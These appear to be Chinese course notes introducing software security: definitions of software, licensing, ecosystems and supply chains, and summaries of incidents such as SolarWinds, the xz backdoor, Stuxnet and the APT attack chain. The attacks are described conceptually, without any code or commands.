# 课程介绍

## 课程目的

- 系统学习软件安全与测试的 `基本方法和技术` ，学会 `应用` 到 `软件开发和软件分析` 的实践中
  - 掌握 `软件安全` 的基本概念和方法
  - 掌握 `软件测试` 的基本方法和技术
  - 解决在现实世界中计算机软件的 `实际安全问题`

## 课程内容

- 软件安全概述
- 软件漏洞
- 软件安全开发
- 安全编程
- 恶意软件

- 软件安全性测试
  - 词法分析数据流分析
  - 模糊测试
  - 程序切片
  - 程序插桩
  - 污点分析
  - 符号执行
  - 渗透测试

- 软件测试概述
- 白盒测试
- 黑盒测试

## 课程考核

- 作业：实验大作业 or 专题研究报告(分组，两人一组)
- 考试：闭卷(有复习提纲)
- 课堂表现

# 第一章 软件安全概述

## 软件

### 软件的定义

- [x] GB/T 11457-2006《信息技术 软件工程术语》给出的软件定义是：与计算机系统的操作有关的 <kbd>计算机程序、规程和可能相关的文档</kbd>

- [x] 软件是程序、数据和文档的集合体
  > - 软件三要素： $\color{red}{软件 = 程序 + 数据 + 文档}$

- `程序` 是完成特定 **功能** 和满足 **性能** 要求的指令序列
- `数据` 是程序运行的 **基础** 和操作的 **对象**
- `文档` 是与程序 **开发、维护和使用** 有关的图文资料
> - 关注点从程序变为数据

#### 软件 VS. 网站

- [x] 网站(Website)开始是指在因特网上根据一定的规则，使用HTML(标准通用标记语言下的一个应用)等工具制作的用于展示特定内容相关网页的集合

- [x] 传统上： `网站` 一般要 `在线` 才能访问； `软件` 一般 `离线` 使用

- [x] 软件发展趋势： `C/S` 客户端/服务器端 → `B/S` 浏览器端/服务器端 → `SaaS` 云计算

- [x] 从某种意义上说： **网站是一种特殊的软件**

#### 数字化时代(A, B, C, D, E, F)

<p align="center">
  <img src="./img/大数据时代.png"></img>
</p>

### 数据安全

- `必要` ：从业务设计而言，必须需要用户提供的 `基础数据` ，必须在业务中产生的 `生产数据` ，必须要使用、查看的 `用户数据` ；称之为必要。
- `使用规则` ：为什么？做什么？要什么？放哪里？谁能操作？
- `同意` ：同意的动机-我自愿还是我 `不得不同意`
- `与服务无关` ：在遵循必要性的原则之下，明确数据采集与服务的 `直接关系` 以及 `间接关系`
- `违法违约` ：法律所定义的有关数据采集、使用、操作等一系列活动所形成的约定；合同所声明的 `在不违反法律法规约定` 下的前述行为
- `轨迹数据`
- `影像数据`
- `语音数据`
- `用户画像`

### 软件 vs. 硬件

- `“硬件”是躯体，“软件”是灵魂`

- “软件”安装的硬件平台
  - 主机(PC、笔记本、服务器等)
  - 网络设备(路由器、交换机、防火墙、UTM等)
  - 消费类电子（智能手机、iPad等）

- “软件”可以包括
  - 操作系统
  - 数据库系统(与系统中的数据有区分)
  - 业务相关的管理信息系统(MIS)，Web网站
  - 手机APP，应用程序商店(App Store)
  - `联网软件` ：通信协议、通信加密、认证等

#### 软件是硬件的护城河

- 2006年，发布Compute Unified Device Architecture(CUDA)
  - 把之前用于图形渲染的流水线GPU架构更新为统一架构，
  - 让 `计算` 任务和 `图形渲染` 任务使用 `共同的硬件单元` 运行
  - 可以基于CPU的通用的编译器和工具链技术发展GPU技术

- 通过大学普及学习以推广CUDA。早在 2010 年，已经有关于 CUDA 数千篇论文，超过 350 所大学进行CUDA 教学课程。英伟达建立了CUDA认证计划、研究中心、教学中心，不断完善 CUDA 的生态链
- 靠着定制的 **软件平台、开发工具、应用工具** ，构建了“由 **软件、大学、初创公司和合作伙伴** 组成的强大而稳健且自给自足的 `生态系统` ”(福布斯评价)

### 软件的特点

- 软件不同于硬件，他是计算机系统中的 `逻辑实体` 而不是物理实体，具有 `抽象性`
- 软件的生产不同于硬件，它没有明显的制作过程，一旦开发成功，可以大量 `拷贝` 同一内容的副本
- 软件在运行过程中不会因为使用时间过长而出现` 磨损、老化` 以及 `用坏` 问题(软件运行可能会变慢 → 重装)
- 由于 `软件漏洞不可避免` ，因此软件一般需要 `不断升级`
- 软件的开发、运行在很大程度上依赖于计算机系统，受计算机系统的限制，在客观上出现了 `软件移植` 问题
- 软件开发复杂性高，开发周期长， `成本较大`
- 软件开发还涉及诸多的 `社会因素`

### 软件的分类

- [x] 按软件的 `功能` 分类
  - `系统软件` ：计算机运行的必不可少的组成部分，它与计算机 `硬件紧密配合` ，控制并协调计算机系统各个部件、相关的软件和数据高效地工作。例如操作系统、设备驱动程序、通信处理程序等
  - `应用软件` ：在 `特定领域` 内开发，为特定目的服务的软件。如MIS、OA等
  - `支撑软件` ： **协助用户开发软件** 的工具性软件，其中包括帮助程序人员开发软件产品的工具，也包括帮助管理人员控制开发进程的工具。例如支持需求/设计/编码/测试的软件、 `IDE` 、SDE等( `中间件` )

- [x] 按软件 `规模` 分类

<p align="center">
  <img src="./img/按软件规模分类.png"></img>
</p>

- [x] 按软件 `工作方式` 分类
  - `实时处理软件` ：在事件或数据产生时立即对它们进行处理，并及时反馈信号，以检测和控制软件的执行
  - `分时软件` ：允许多个用户使用同一台计算机，允许多个程序 `分时共享硬件和软件资源` ，或者允许多个联机用户使用同一计算机
  - `交互式软件` ：能实现 `人-机通信`
  - `批处理软件`：把一组输入作业或一批数据以 `成批` 的方式一次运行，并按照 `顺序` 逐个处理

- [x] 按软件 `服务对象` 的范围划分
  - `项目软件` ：又称为 `定制软件` ，是受某个特定客户(或少数客户)的委托，由一个或多个软件开发机构在 `合同的约束` 下开发的软件
  - `产品软件` ：指向用户提供的计算机软件、信息系统、套装软件或在提供计算机信息系统集成、应用服务等技术服务时提供的软件，是 `通用` 的产品或应用于 `某一行业领域` 的产品，而不是像软件项目一样为某一需求或者单位定制开发

- [x] 按软件 `运行平台` 划分
  - 服务器端软件
  - PC端软件
  - 手机应用软件
  - 嵌入式软件

- [x] 按 `授权方式` 划分
  - `专属软件` ：此类授权通常 **不允许用户随意的复制、研究、修改或散布该软件** 。违反此类授权通常会有严重的法律责任。传统的商业软件公司会采用此类授权，例如微软的Windows和办公软件。专属软件的源码通常被公司视为私有财产而予以严密的保护
  - `自由软件` ：此类授权正好与专属软件相反，赋予用户复制、研究、修改和散布该软件的权利，并 `提供源码` 供用户自由使用，仅给予些许的其它限制。以Linux、Firefox和OpenOffice可做为此类软件的代表
  - `共享软件` ：通常可免费的取得 `并使用其试用版` ，但在功能或使用期间上受到限制。开发者会鼓励用户付费以取得功能完整的商业版本。根据共享软件作者的授权，用户可以从各种渠道免费得到它的拷贝，也可以自由传播它
  - `免费软件` ：可免费取得和转载，但并不提供源码，也无法修改
  - `公共软件` ：原作者已放弃权利，著作权过期，或作者已经不可考究的软件。使用上无任何限制

#### 开源软件的授权方式

- 开源软件共同特点：源代码开放、免费修改、免费重新发布

- `GPL(GNU General Public License)` ： `自由软件` 。允许免费修改、免费重发布，但 **要求修改代码必须也遵守GPL** 。在GPL下面还有LGPL，允许商业代码链接LGPL代码，这样商业软件在利用LGPL软件的同时能够很大程度上保留商业利益。如Linux/gcc/KDE等

- `BSD(Berkeley Software Distribution)` ： `公共域软件` ，其中apache的授权叫APL(Apache Licence)，是比较典型的授权声明。MIT(MIT License)与之类似。虽然保留版权，但不但免费修改、免费重新发布，而且允许商业使用， **允许商业修改后不公布修改的软件代码** 。如Chromium/xWindows/freeBSD/apache/perl/python/ruby等

- `MPL(Mozilla Public License)` ：商业公司的开源策略。允许免费重发布、免费修改，但 **要求修改后的代码版权归软件的发起者** ，这样发起者和组织者具有更优越的地位。MPL一般也是同时遵守LGPL的。如mozilla/openoffice/vim等

### 软件开发语言

- [x] 编程语言历史
  - Computer Languages History
  - https://www.levenez.com/lang

- [x] 编程语言流行指数
  - PYPL: PopularitY of Programming Language
  - http://pypl.github.io

### 软件 → 服务

- 软件即服务(Software as a Service，简称 `SaaS` )
  - 是一种软件交付模式（云计算服务模式之一）
  - 在这种交付模式中， `云端` 集中式托管软件及其相关的数据，软件仅需通过互联网，而 **不需安装即可使用**
  - 用户通常使用精简客户端经由一个网页 **浏览器** 来访问软件即服务
  - 通过将 **硬件和软件维护及支持** `外包` 给软件即服务的提供者，来降低信息技术成本

### 软件 → 软件生态系统

- 英伟达的CUDA(Compute Unified Device Architecture)生态系统
- 苹果手机的软件生态系统
  - `app Store` ： 应用商店，为iOS设备提供了超过百万款的应用程序。开发者可以通过App Store将应用程序推广并销售给全球的苹果用户
  - `iOS操作系统` ： 移动操作系统，运行在iPhone、iPad和iPod Touch等设备上。它为开发者提供了丰富的开发工具和框架，让他们能够创建功能丰富、高性能的应用程序
  - `开发者平台`： 包括开发者工具(如Xcode)和资源(如文档、样例代码等)，帮助开发者创建和优化iOS应用程序
  - `用户体验和生态一体化` ： 通过 **严格的审核和设计标准** ，确保App Store中的应用在用户体验和安全性方面保持高水准。 **iOS设备和苹果生态系统的无缝整合** 也是其优势之一，例如iCloud、Apple Pay、HealthKit等
  - `开发者社区` ： 苹果的生态系统促进了一个庞大的开发者社区，这个社区提供了技术支持、交流和合作机会，使得开发者能够共同成长并创造出更多创新的应用和服务

#### 软件生态系统

- 2016年，Ｍanikas等人将 `软件生态系统` 定义为“在 **公共的技术基础设施** 上软件产品与服务以及相关涉众者相互作用而形成的复杂系统”，强调软件生态系统中利益相关者采用 **数据共享、知识分享、软件产品及服务提供** 等方式为软件生态系统做贡献

- `软件生态系统` 是指在一个 **共同的技术平台上** ， **众多的参与者协同合作** ，最终形成 **大量的软件解决方案或服务** 。软件生态系统目前是在软件平台上结合内部和外部参与者开发的组件来构建大型软件系统的有效方法

##### 软件生态系统的构成

<p align="center">
  <img src="./img/软件生态系统的构成.png"></img>
</p>

- 按照对软件生态系统的重要程度，将利益相关者扮演的角色细化为：
  - `核心开发者` 类似于自然生态系统中的 **植物** ，他们利用环境提供的各类资源开发出对软件生态系统生存与发展起到 **关键作用** 的软件制品
  - `活跃开发者` 类似于自然生态系统中的 **植食性动物** ，贡献新的软件制品、参加软件测试及运维工作
  - `外围开发者` 类似于自然生态系统中的 **猎食者** ，运用已有的软件制品编织形成 **面向终端用户** 的软件产品
  - `用户` 是软件生态系统中的 **顶级猎食者** ，使用软件产品为其 **工作、生活服务** ，把软件体验、对软件生态系统的期望反馈给软件生态系统，推动软件生态系统不断发展

##### 软件生态系统的分类

- 软件生态系统种类繁多，从不同视角对软件生态系统进行解读，派生出不同的软件生态系统分类方法
  - 按照 `商业诉求` 情况：划分为 `商业` 软件生态系统、 `免费及开源` 软件生态系统
  - `软件部署环境` 差异：划分为 `服务器` 软件生态系统、 `桌面` 软件生态系统、 `嵌入式` 软件生态系统、 `云计算` 软件生态系统
  - 软件 `在计算机系统中扮演角色` 不同：划分为 `系统软件` 生态系统、 `支撑软件` 生态系统和 `应用软件` 生态系统
  - 将软件生态系统和 `应用领域` 相结合，则产生行业应用软件生态系统：智能汽车软件生态系统、智慧农业软件生态系统、互联网教育软件生态系统、社交软件生态系统、智慧医疗软件生态系统、区块链应用软件生态系统等

### 软件 → 软件供应链

- [x] 时至今日，绝大多数的开发者 **并不是从零开始开发软件** ，而是在创建软件时依赖 **第三方资源** 。通过**使用预先构建的库和开源组件** ，工程师们可以加快开发进程并且降低生产成本，从而快速将产品推向市场

- [x] “ `供应链` ”这一术语通常用于 **制造业** ，是指 **制作和分发一个产品的人员和流程** 。例如，一家造飞机的公司会自己制造一些部件，也会从其他公司购买和组装部件。他们根据设计规格组装零件，然后对新飞机进行测试。通过测试后，新飞机会被交付到航空公司和飞行员手中

- `软件供应链` 定义为在软件开发中所涉及到的 **组件、开发流程** 以及投入 **生产** 和最终软件产品 **分发** 的过程

#### 软件供应链的构成

- [x] 构成软件的诸多组件中，有部分依赖项并非由你的团队开发
  - 硬件和基础架构
  - 操作系统
  - 编译器和编辑器
  - 驱动和依赖项
  - 开源脚本和打包好的软件
  - 代码仓库引擎、测试套件以及CI/CD(持续集成/持续交付或部署)工具
  - 云服务和数据中心
  - **公司外部的人员配置** ，比如外包公司、咨询师以及供应商等

- `软件供应链安全` ：软件供应链上 **软件设计与开发的各个阶段** 中来自 **本身** 的编码过程、工具、设备或 **供应链上游** 的代码、模块和服务的安全，以及 **软件交付渠道及使用过程** 安全的总和

#### 软件供应链安全

- 2020年底，威胁攻击者成功入侵SolarWinds Orion软件的 `开发环境` ，在其中植入大量恶意代码。此后，包括美国国务院、五角大楼、国土安全部、商务部、财政部、国家核安全委员会等部门以及多个财富500强在内的SolarWinds Orion客户相继遭到网络袭击

- 后续调查显示，早在2019年9月，攻击者可能已经秘密访问公司内部网络系统，对文件 SolarWinds.Orion.Core.BusinessLayer **.dll的源代码进行篡改，并添加了后门代码** 。几天后，便开始在编译服务器上修产品发布流程，植入恶意代码并进行测试，这一过程持续近两个月

- 2021年底，深植于全球软件供应链的知名开源日志组件ApacheLog4j被曝存在“ `核弹级` ”的远程代码执行漏洞

- 2022年，Gartner就将“软件供应链”列为了 2022年的第二大威胁，并预测到 2025 年， **全球45%组织难免会一次甚至多次成为受害者**

##### xz供应链安全事件

- xz供应链安全事件的主要时间线如下：
  - 2021年1月26日，GitHub账号JiaT75创建
  - 2022年起该账号开始向XZ Utils项目贡献代码
  - 2024年2月24日，在GitHub release中发布了第一个包含后门的版本5.6.0。
  - 2024年3月30日，微软工程师Andres Freund在排查sshd服务异常后发现xzutils的上游tar包问题，并报告给oss-security社区。随即引发各大安全厂商的轮番研判

- XZ-Utils是Linux、Unix等POSIX兼容系统中广泛用于处理.xz文件的套件，包含liblzma、xz等组件，已集成在Debian、Ubuntu、CentOS等发行版仓库中。作为一种通用的 `数据压缩格式` ，liblzma/xz通常也会集成在各类社区项目或是商业产品发行版中

- 本次xz事件的威胁主要是由于SSH底层依赖liblzma等组件，攻击者可利用后门在受影响的系统上 **绕过SSH远程连接的认证，直接获得系统权限，执行任意代码**

##### 蓝屏死机

- 北京时间2024年7月19日中午开始，全球多地用户在X、脸书、微博等社交平台反映使用微软系统的电脑出现蓝屏现象，至少20多个国家的交通、金融、医疗、零售等行业或公共服务的业务系统受到影响，全球约850万台设备宕机

- 出现故障的终端并不止限于桌面终端，而是 **覆盖了大量的服务器和云节点** ，包括导致了多个重要的微软和AWS的 **云服务和租户服务中断**

- 原因：CrowdStrike公司的终端安全软件“Falcon Sensor”推送的 **错误的配置更新与Windows系统发生了兼容性问题** ，导致系统崩溃，即“蓝屏死机”

> - $\color{blue}{安全软件 → 操作系统 → 云服务 → 云租户 → 业务系统}$

#### 如何缓解供应链攻击？

- `供应商审查和管理` ：将供应商的数字资产纳入全面的、基于真实风险的安全评估体系中，通过要求供应商提供 **安全合规性文件、安全认证和独立审计报告** ，建立一个包括评估潜在供应商的安全实践、安全标准和数据保护措施的全面供应商审查程序

- `减少第三方和开源组件依赖` ：审查和评估其对第三方和开源组件的依赖情况， **识别和分析所有使用的第三方库、框架和工具，了解其安全性和稳定性** ，通过对第三方和开源组件的全面审查，可以识别潜在的安全风险和漏洞，及时采取措施进行修复或替换

- `数据交换与可见性权限控制` ：采取有效的措施来管理数据交换和可见性权限，以确保 **只有合适的人员能够访问和处理敏感信息** ，采用加密技术保护数据在传输过程中的安全，确保数据在传输过程中不被窃取或篡改

- `可信、透明与溯源` ：建立可信、透明的供应链生态系统，与供应商建立长期合作关系，并确保他们 **符合一定的安全标准和规范，通过建立信任和透明度** ，可以降低供应链攻击的风险，因为供应商将更加积极地配合安全措施和审查

## 软件安全

### 软件面临的安全威胁

- 软件自身的安全(软件漏洞)

- 恶意代码

- 软件侵权

#### 软件漏洞(Vulnerability)

- **软件漏洞是普遍存在的** ，系统软件、应用软件和第三方软件，它们在开发、部署和应用中的问题层出不穷

- `软件漏洞` 通常被认为是软件生命周期中与安全相关的 **设计错误、编码缺陷及运行故障** 等
  - 本课程并不对软件漏洞/脆弱点、软件缺陷以及软件错误等概念严格区分
  - 一方面，软件漏洞可能会造成软件在运行过程中出现 `错误结果` 或 `运行不稳定` 、 `崩溃` 等现象，甚至引起死机等情况
  - 另一方面，软件漏洞会被黑客 `发现、利用` ，进而实施窃取隐私信息、甚至破坏系统等 `攻击` 行为

- 软件漏洞利用过程：

<p align="center">
  <img src="./img/软件漏洞利用过程.png"></img>
</p>

##### 漏洞库

- 中国国家信息安全漏洞共享平台CNVD(由CNCERT维护)：
  > - http://www.cnvd.org.cn
- 国家信息安全漏洞库(由中国信息安全评测中心维护)：
  > - http://www.cnnvd.org.cn
- 绿盟科技-安全漏洞：
  > - http://www.nsfocus.net/index.php?act=sec_bug
- 美国国家信息安全漏洞库： https://nvd.nist.gov/
- CVE(美国国土安全资助的MITRE公司负责维护) ：
  > - https://cve.mitre.org/
- 赛门铁克的漏洞库： https://www.securityfocus.com/
- Offensive Security公司漏洞库： https://www.exploit-db.com/

#### 恶意代码(Malware)

- `恶意代码` (Malicious software)是在 **未被授权** 的情况下， **以破坏软硬件设备、窃取用户信息、干扰用户正常使用、扰乱用户心理为目的** 而编制的软件或代码片段
- 定义指出，恶意代码是软件或代码片段，其实现方式可以有多种，如二进制执行文件、脚本语言代码、宏代码或是寄生在其他代码或启动扇区中的一段指令

- 恶意代码包括：
  - `计算机病毒` (Virus)
  - `蠕虫` (Worm)
  - `木马` (Trojan Horse)
  - `后门` (Back Door)
  - 内核套件(Rootkit)
  - 间谍软件(Spyware)
  - `网络钓鱼` (Phishing)
  - 恶意脚本(Malice Script)
  - 恶意广告(Dishonest Adware)
  - 流氓软件(Crimeware)
  - 逻辑炸弹(Logic Bomb)
  - `僵尸网络` (Botnet)
  - 垃圾信息(Spam)
  - `勒索软件` (Ransomware)

#### 软件侵权

- 主要指 `侵犯版权` (著作权)，常见侵权行为：
  - 未经软件著作权人许可，发表、登记、 **修改、翻译** 其软件
  - 将他人软件作为自己的软件发表或者登记，在他人软件上署名或者更改他人软件上的署名
  - 未经合作者许可，将与他人合作开发的软件作为自己单独完成的软件发表或者登记
  - **复制或者部分复制** 著作权人的软件
  - 向公众发行、出租、通过信息网络传播著作权人的软件
  - **故意避开或者破坏** 著作权人为保护其软件著作权而采取的技术措施
  - 故意删除或者改变软件权利管理电子信息
  - 转让或者许可他人行使著作权人的软件著作权

### 零日漏洞(zero-day)

- `恶意软件` 作为网络战武器对国家关键基础设施乃至整个国家的巨大破坏力。攻击者为了能够有效达到窃取数据、破坏系统的目的，可以通过挖掘或是购买零日漏洞， **开发针对零日漏洞的攻击工具** 实施攻击

- `零日漏洞` 是指 **未被公开披露** 的软件漏洞， **没有** 给软件的作者或厂商以 **时间** 去为漏洞 **打补丁** 或是给出 **建议解决方案** ，从而攻击者能够利用这种漏洞破坏计算机程序、数据及设备

- 注意，零日漏洞并不是指软件发布后被立刻发现的漏洞

- 利用零日漏洞开发攻击工具进行的攻击称为 `零日攻击`

- 零日攻击针对的漏洞由于软件厂商还没有发现或是还未及提供相应的补丁，所以零日攻击的 **成功率高，造成的破坏大**

- 从日常黑客攻击到军事领域的对抗，从 `震网` 病毒到 `棱镜门` 事件，信息空间的几乎所有攻防对抗都是以软件安全问题为焦点展开的

### 网络武器

- 震网病毒， `第一个直接破坏` 现实世界中 `工业基础设施` 的恶意代码，世界上首个网络“ `超级武器` ”(2010年6月首次发现)

- **突破工业专用局域网的物理限制** ，对西门子公司的数据采集与监控系统SIMATIC WinCC进行攻击。该系统在我国多个重要行业应用广泛，被用来进行钢铁、电力、能源、化工等重要行业的人机交互与监控

- 感染了全球超过 45000个网络，伊朗遭到的攻击最为严重，60%的个人电脑感染了这种病毒

- 伊朗约20%的离心机因感染病毒而失灵甚至是完全报废。伊朗核武器计划也遭受挫折，西方专家预测伊朗造出核弹的时间也从一年后推迟到三年后

#### 震网病毒

- Stuxnet蠕虫病毒(超级工厂病毒)

##### 震网病毒利用的漏洞

- 震网病毒利用了微软操作系统中至少5个漏洞和2个西门子公司的SIMATIC Wincc系统漏洞，另外还有2个有效数字证书

- 震网病毒利用的微软Windows操作系统的漏洞有：
  - RPC远程执行漏洞(MS08一067)
  - 快捷方式文件解析漏洞(MS10一046)
  - 打印机后台程序服务漏洞(MS10一061)
  - 内核模式驱动程序权限提升漏洞(MS10一073)
  - 任务计划程序权限提升漏洞(MS10一092)

- 除了第1个是早已被发现的漏洞外，后4个漏洞都是在震网病毒中 **首次被使用** ，是真正的 **零日漏洞**

### APT攻击

- `高级持续性威胁(Advanced Persistent Threat)`
- APT是一种复杂的、持续的网络攻击，包含三个要素：高级、长期、威胁
  - `高级` 是指执行APT攻击需要比传统攻击更高的 **定制** 程度和 **复杂** 程度，需要花费大量时间和资源来研究确定系统内部的漏洞
  - `长期` 是为了达到特定目的，过程中“放长线”， **持续监控目标** ，对目标保有 **长期的访问权**
  - `威胁` 强调的是 **人为参与策划** 的攻击， **攻击目标是高价值的组织** ，攻击一旦得手，往往会给攻击目标造成巨大的经济损失或政治影响，乃至于毁灭性打击

#### APT攻击链

- [x] APT攻击者通常是一个组织，从瞄准目标到大功告成，要经历多个阶段，在安全领域这个过程叫做 **攻击链**

- [x] 每个厂家对于攻击链的步骤定义略有差异，但本质上相差不大

<p align="center">
  <img src="./img/APT攻击链.png"></img>
</p>

##### APT攻击链：信息收集

- 攻击者 **选定目标** 后，首先要做的就是 **收集所有跟目标有关的情报信息**

- 这些情报可能是目标的组织架构、办公地点、产品及服务、员工通信录、管理层邮箱地址、高层领导会议日程、门户网站目录结构、内部网络架构、已部署的网络安全设备、对外开放端口、企业员工使用的办公OS和邮件系统、公司web服务器的使用的系统和版本等等

##### APT攻击链：外部渗透

- 信息收集完成后，就要考虑如何渗透到组织内部。 **从钓鱼邮件、web服务器还是U盘入手** ？如果是钓鱼邮件，利用哪种客户端软件的 **零日漏洞** ？如果是web服务器，目标用户最常去的网站有哪些？

- 渗透手段确定后，下一步则需要 **制作特定的恶意软件**。通常，攻击者所在组织会有专门的一拨人从事零日漏洞的挖掘和利用，他们也会密切关注一些漏洞报告平台上的最新公告，利用这种公开或半公开披露的漏洞原理以及可能的POC代码来进一步制作自己的趁手武器，例如带有 **恶意代码** 的pdf文件或office文件。这种恶意代码被称作 <kbd>shellcode</kbd> ，往往短小精悍，采用代码混淆、加壳、加密等反侦测手段，并在投递之前用各种最新的防病毒软件检测一遍，以期在投递到目标网络之后尽可能不被发现

- 恶意软件制作好，下一步是把它 **投递到目标网络内** 。常用的手法包括邮件附件、网站(挂马)、U盘等
  - 对于 **钓鱼邮件攻击** ，黑客务必要精心构造一封足以乱真的邮件内容，邮件标题、邮件内容、附件的名称和类型，都要让收件者放松警惕，产生兴趣，最终打开邮件附件或邮件正文中的URL链接。例如2020年结合疫情热点发送钓鱼邮件或制作诱饵文件，成为了全球高级持续性威胁的普遍趋势
  - 对于网站(挂马)，要根据攻击目标的兴趣爱好，选择一个合适的网站下手，这个网站必须存在可被利用的零日漏洞，然后对网站展开渗透和攻击，攻破后放上一个能自动在后台进行下载的脚本，让访问该网页的目标用户在不知不觉中就把含有恶意软件下载到本地，同时利用浏览器漏洞来安装执行
  - 而使用U盘载体来投递恶意软件的攻击行为，一般需要近距离的接触。当攻击目标不在internet上，不连接外网时，是一种手段

##### APT攻击链：命令控制

- 当目标用户使用含有漏洞的客户端程序或浏览器打开带有恶意代码的文件时，就会被恶意代码击中漏洞，下载并安装恶意软件，恶意软件通常是一个体积很小的 **远程控制工具** ，业内简称为RAT(即Remote Administration Tool，或Remote AccessTrojan)，用于与控制服务器建立 **C&C信道**

- 恶意程序一般还会提升权限或添加管理员用户，把自己设置为开机启动，甚至在后台悄悄关闭或修改主机防火墙设置，以让自己尽可能不被发现

##### APT攻击链：内部扩散

- 同一个组织机构内部的办公主机往往都是相同的系统、类似的应用软件环境，因此很大程度上具备相同的漏洞

- 攻陷一台内网主机后，恶意程序会 **横向扩散到子网内其他主机或纵向扩散到企业内部服务器**

- 由于RAT具备键盘记录和屏幕录像功能，因此很容易获取用户的域密码、邮箱密码及各类服务器密码

##### APT攻击链：数据泄露

- 聪明的黑客在攻击的每一步过程中都通过 **匿名网络、加密通信、清除痕迹** 等手段来自我保护

- 在机密信息外发的过程中，也会采用各种技术手段来避免被网络安全设备发现
  - 一方面 **化整为零** ，将机密信息打散、加密或混淆，避免DLP设备通过关键字扫描发现泄密
  - 另一方面会 **限制发送的速率** ，以尽量不超过各类安全设备的检测阈值

#### ART攻击示例

- 极光攻击
- 海莲花攻击

#### APT攻击的特点

- `攻击者组织严密` ：往往是一个组织发起的攻击，可能具有军事或政治目的，有时会与某个国家关联在一起，而且背后往往有强大的资金支持
- `针对性强` ：攻击者不会盲目攻击，一般会很有针对性的选择一个攻击目标，该目标往往具有军事、政治、经济上的较高价值
- `手段高超` ：APT攻击的恶意代码变种多且升级频繁，结合尚未发布的零日漏洞，使得基于特征匹配的传统检测防御技术很难有效检测出攻击
- `隐蔽性强`：APT攻击者具有较强的隐蔽能力，不会像DDoS攻击一样构造大量的报文去累垮目标服务器，基于流量的防御手段很难发挥作用；在整个过程中都会使用高级逃逸技术来刻意躲避安全设备的检查，在系统中并无明显异常，基于单点时间或短时间窗口的实时检测技术和会话频繁检测技术也难以成功检测出异常攻击
- `持续时间长` ：攻击者一般都很有耐心，渗透过程和数据外泄阶段往往会持续数月乃至数年的时间

### 对软件安全必须给与强烈关注

- 软件安全应当引起重视，应当成为当务之急，甚至成为国家的一项竞争优势

- `错误认识一` ：应对安全威胁的主要手段是 **密码** 技术，是添置 **边界防护** 等各种安全设备

- 是什么真正引发了当今世界大多数的信息安全问题？有人会回答，是 **黑客** 的存在

- 那么黑客和网络犯罪分子的主要目标是什么？有人会回答，是重要的信息资产，是各类敏感 **数据**

- 黑客是如何实现盗取重要信息资产的？黑客成功实施攻击的途径是什么？那就是发现、挖掘和利用信息系统的 **漏洞**

- `错误认识二` ：不值得在关注软件安全，降低糟糕的软件开发、集成和部署带来的风险上花费成本

- 软件项目受限成本和进度，往往牺牲安全
  - 软件工程人员 `缺少安全意识` 和教育的专门 `培训`
  - 通常在开发 `后期` 进行 `测试` 以消除编码错误或缺陷

- **开发出安全漏洞尽可能少的软件** 应当是软件开发者或者说是 **软件厂商** 追求的目标
  - 根据现实世界的经验，保证方案具有 **较好的成本效益、操作相关性和可行性以及投资的可行性**

### 软件安全的概念

- 国家标准GB/T 30998—2014《信息技术 软件安全保障规范》给出的软件安全(Software Safety)的定义是：
  - 软件工程与软件保障的一个方面，它提供一种 **系统的方法** 来 **标识、分析和追踪** 对 `危害` 以及具有危害性的功能(例如数据和命令)的 `软件缓解措施与控制`

- `软件安全` 就是使 软**件在受到恶意攻击的情形下依然能够继续正确运行的工程化软件思想**
  - Gary McGraw, Cigital公司CTO
  - 《Software Security: Building Security In》/《软件安全：使安全成为软件开发必需的部分》
  - BSI内建安全开发模型
  - http://buildsecurityin.us-cert.gov/portal/

- 采用 **系统化、规范化、和数量化** 的方法来指导构建 **安全的软件**

#### Safety VS. Security

- 国内外大多数软件安全标准中，软件安全用的是Software $\color{red}{Safety}$ ，而非Software  $\color{red}{Security}$
  - safety侧重于对 `无意` 造成的事故或事件进行安全保护，可以是加强人员培训、规范操作流程、完善设计等方面的安全防护工作
  - security则侧重于对 `人为的有意` 的破坏进行的保障和保护，比如部署专门安全设备进行防护、加强安全检测等

- 对于软件安全，既要考虑软件系统中开发人员 **无意** 的错误，又要考虑 **人为地** 故意地针对软件系统的渗透和破坏，因此，通常不对Software Safety和Software Security进行区分

### 软件安全的三种研究

- [x] 软件测试，漏洞挖掘，脆弱性分析

- [x] 软件验证，证明

- [x] 软件容错，冗余，备份

### 软件安全

- **软件安全 vs. 安全的软件，不是一回事**

- 软件安全是一种 `系统级` 的问题，需要考虑 **安全机制** (比如访问控制)和基于 **安全的设计** (比如使攻击难以实施的健壮设计)

- 软件安全必须成为 **完整的软件开发生命周期** 方法的一部分

#### 从计算机安全属性理解软件安全

- CIA模型：保密性、完整性、可用性
  - 物理隔离、访问控制、信息加密等
  - 哈希值计算、数字签名
  - 系统容侵容错、备份与灾难恢复、应急响应

- 还有：可认证性、授权、可审计性、抗抵赖性、可控性、可存活性等

##### 计算机安全 → 软件安全的特点

- [x] 软件安全是计算机安全的一个分支

- [x] 软件安全是计算机安全的关键

- [x] 软件安全问题的根源是软件存在弱点

- [x] 用工程化的方法来实施软件安全

- <kbd>软件安全是计算机安全的一个分支</kbd>
  > - ***计算机安全的研究范畴包括硬件安全、软件安全、数据安全、运行安全和网络安全***

##### 软件安全是计算机安全的关键

- 软件是计算机安全的大问题， **危害计算机安全的绝大部分因素都与软件相关**
  - 软件的 `不稳定` 导致系统崩溃和数据丢失
  - 病毒攻击的是软件的 `缺陷`
  - 黑客利用的是软件的 `弱点`
  - 机密和隐私的泄漏是因为软件存在 `漏洞`

- $\color{red}{计算机安全中的首要和关键问题是软件问题}$

##### 软件安全问题的根源是软件存在弱点

- **现有方法并不能解决软件安全问题**
  - 反病毒程序和防火墙之类的保护程序
  - 密码学之类的信息加密技术

- 假设有一个程序，其密码验证是用加密算法来实现的，它安装在一个被防火墙保护的系统中，系统中安装了反病毒程序
  - $\color{red}{这个程序是否健壮}$ ，可能存在溢出类弱点
  - $\color{red}{没有谁能保证防火墙和反病毒软件是完全可靠的}$ ，它们也可能存在缓冲区溢出之类的弱点

##### 用工程化的方法来实施软件安全

- [x] 软件安全问题的根源就是我们所依赖的 ***软件存在太多的安全弱点*** ，而不断增加的 **软件复杂性和可扩展性** 更是火上浇油般地助长了这种情形

- [x] 解决软件安全问题的根本方法就是改善 **我们建造软件的方式，用工程化的方法来实施软件安全** ，以建造健壮的软件，使其在遭受恶意攻击时依然能够安全可靠和正确运行

##### 任何软件都是不安全的

- 测试只能减少软件安全问题的发生，但是不能完全解决安全问题

- 业界公认一个事实： **几乎所有的软件都是带着安全隐患投入运行**

- 从技术方面讲，软件的安全问题是普遍存在的。黑客总可以采取种种手段入侵，让用户防不胜防

##### 软件不安全性的表现

